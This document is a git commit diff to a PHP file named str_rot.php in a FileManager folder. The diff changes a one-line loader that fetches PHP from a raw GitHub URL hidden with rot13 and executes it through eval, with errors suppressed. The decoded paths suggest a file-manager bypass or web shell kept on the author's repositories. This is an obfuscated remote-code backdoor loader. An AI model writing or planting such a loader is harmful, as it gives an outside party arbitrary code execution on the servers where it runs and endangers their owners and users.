19c13580382d7870498d37a567b6280fabd708b9
Rahman Saputra <69113156+NoobTecho@users.noreply.github.com>
2025-01-05 19:17:20 +0700

    Update str_rot.php

--- FileManager/str_rot.php
+++ FileManager/str_rot.php
@@ -1,4 +1,4 @@
 # 7717171
 <?php
-@eval("?>" . @file_get_contents(str_rot13("uggcf://enj.tvguhohfrepbagrag.pbz/AbboGrpub/j/ersf/urnqf/znva/SVyrZnantreOlcnff/jbbc-nfpvv.cuc")));
+@eval("?>" . @file_get_contents(str_rot13("uggcf://enj.tvguhohfrepbagrag.pbz/AbboGrpub/NyngGrzche/ersf/urnqf/znva/SvyrZnantre/bevtvany.cuc")));
 ?>
